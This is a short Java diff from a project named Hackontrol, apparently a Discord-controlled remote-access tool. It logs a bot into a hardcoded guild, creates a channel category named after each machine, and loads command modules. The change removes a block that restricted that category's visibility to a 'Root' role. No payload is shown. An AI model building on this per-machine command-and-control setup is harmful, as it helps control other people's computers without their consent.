@@ -24,10 +24,8 @@ import com.khopan.hackontrol.utils.HackontrolError;
 
 import net.dv8tion.jda.api.JDA;
 import net.dv8tion.jda.api.JDABuilder;
-import net.dv8tion.jda.api.Permission;
 import net.dv8tion.jda.api.entities.Guild;
 import net.dv8tion.jda.api.entities.MessageHistory;
-import net.dv8tion.jda.api.entities.Role;
 import net.dv8tion.jda.api.entities.channel.concrete.Category;
 import net.dv8tion.jda.api.entities.channel.concrete.TextChannel;
 import net.dv8tion.jda.api.requests.GatewayIntent;
@@ -79,16 +77,6 @@ public class Hackontrol {
 		this.guild = this.bot.getGuildById(1173967259304198154L);
 		this.machineIdentifier = Information.getMachineName();
 		this.category = this.getOrCreateCategory(this.guild, this.machineIdentifier);
-		List<Role> roleList = this.guild.getRolesByName("Root", true);
-
-		if(!roleList.isEmpty()) {
-			Role role = roleList.get(0);
-			long everyoneRole = this.guild.getPublicRole().getIdLong();
-			long identifier = role.getIdLong();
-			this.category.getManager()
-			.putRolePermissionOverride(everyoneRole, null, List.of(Permission.VIEW_CHANNEL))
-			.putRolePermissionOverride(identifier, List.of(Permission.VIEW_CHANNEL), null).queue();
-		}
 
 		for(int i = 0; i < this.moduleList.size(); i++) {
 			Module module = this.moduleList.get(i);
